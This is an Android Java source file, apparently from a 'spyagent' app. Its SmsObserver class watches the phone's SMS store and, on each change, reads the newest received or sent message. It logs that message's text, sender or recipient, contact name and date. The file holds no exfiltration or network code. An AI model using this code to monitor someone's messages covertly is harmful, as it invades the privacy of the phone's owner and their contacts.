package com.irodyk.spyagent.control.sms;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.util.Log;

/**
 * Created by i.rodyk on 8/30/16.
 */
public class SmsObserver extends ContentObserver {

    private static final String PROTOCOL = "protocol";
    private static final int TYPE_RECEIVED = 1;
    private static final int TYPE_SENT = 2;

    private static final String ID = "_id";
    private static final String THREAD_ID = "thread_id";
    private static final String PERSON = "person";
    private static final String ADDRESS = "address";
    private static final String DATE = "date";
    private static final String READ = "read";
    private static final String STATUS = "status";
    private static final String REPLY_PATH_PRESENT = "reply_path_present";
    private static final String SUBJECT = "subject";
    private static final String BODY = "body";
    private static final String ERROR_CODE = "error_code";


    private Context mContext;

    private String contactId = "", contactName = "";
    private String smsBodyStr = "", phoneNoStr = "";
    private long smsDatTime = System.currentTimeMillis();
    static final Uri SMS_URI = Uri.parse("content://sms");

    private int smsCount;

    public SmsObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
        smsCount = 0;
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        readSms();
    }

    private void readSms(){
        Cursor cursor = null;
        try{
            cursor = mContext.getContentResolver().query(SMS_URI, null, null, null, "_id");
            if(cursor == null){
                return;
            }
            cursor.moveToLast();
            int id = Integer.parseInt(cursor.getString(cursor.getColumnIndex("_id")));

            if(id != smsCount && id > 0){
                smsCount = id;

                int type = Integer.parseInt(cursor.getString(cursor.getColumnIndex("type")));

                if(type == TYPE_RECEIVED){
                    // handle the received sms
                    Log.e("Info","Body RECEIVED: " + cursor.getString(cursor.getColumnIndex(BODY)));
                    Log.e("Info","PERSON RECEIVED: " + SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
                    Log.e("Info","ADDRESS RECEIVED: " + cursor.getString(cursor.getColumnIndex(ADDRESS)));
                    Log.e("Info","DATE RECEIVED: " + cursor.getString(cursor.getColumnIndex(DATE)));
                }
                else if (type == TYPE_SENT){
                    // handle the sent sms
                    Log.e("Info","Body SENT: " + cursor.getString(cursor.getColumnIndex(BODY)));
                    Log.e("Info","PERSON SENT: " + SmsUtils.getContactName(mContext, cursor.getString(cursor.getColumnIndex(ADDRESS))));
                    Log.e("Info","ADDRESS SENT: " + cursor.getString(cursor.getColumnIndex(ADDRESS)));
                    Log.e("Info","DATE SENT: " + cursor.getString(cursor.getColumnIndex(DATE)));
                }
            }
        } finally {
            if(cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
        }
    }
}
